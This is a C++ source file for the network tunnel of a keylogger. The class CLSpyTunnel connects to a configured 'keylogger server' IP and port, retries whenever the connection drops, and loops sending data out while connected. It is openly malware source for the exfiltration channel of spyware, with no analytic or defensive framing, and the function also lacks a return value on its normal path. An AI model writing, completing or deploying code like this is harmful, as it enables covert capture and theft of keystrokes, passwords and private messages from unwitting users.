#include "clspytunnel.hpp"

int CLSpyTunnel::init(char* __ip, const uint __port, int* __p_shutdown_flag) {
    int rc;
    int error = 0;
    socklen_t len = sizeof(error);
    ip_ = __ip;
    port_ = __port;
    p_shutdown_flag_ = __p_shutdown_flag;
    socket_ = -1;

    memset(&server_addr_, 0, sizeof(server_addr_));
    server_addr_.sin_family = AF_INET;
    server_addr_.sin_port = htons(port_);
    if (inet_pton(AF_INET, ip_, &server_addr_.sin_addr) <= 0) {
        printf("Invalid address or address not supported\n");
        return -1;
    }

    while (!*p_shutdown_flag_) {
        retry_flag_ = false;
        
        socket_ = socket(AF_INET, get_conn_type(), 0);
        if (socket_ < 0) {
            printf("Socket creation failed: %s\n", strerror(errno));
            return -1;
        }
        rc = connect(socket_, (struct sockaddr*) &server_addr_, sizeof(server_addr_));
        if (rc < 0) {
            if (errno == ECONNREFUSED || errno == ETIMEDOUT) {
                printf("Trying to connect to the server\n");
                goto retry;
            } else {
                printf("Connection failed: %s\n", strerror(errno));
                return -1;
            }
        }

        if (getsockopt(socket_, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
            printf("Connection verification failed: %s\n", strerror(error));
            goto retry;
        }
        printf("Connected to keylogger server %s:%d\n", ip_, port_);

        while (!retry_flag_ && !*p_shutdown_flag_) {
            // Connection successful
            retry_flag_ = send_out(socket_, EXEC_SUCCESS);
        }

        retry:
            if (!*p_shutdown_flag_) {
                close(socket_);
                socket_ = -1;
                sleep(1);
            }
    }
}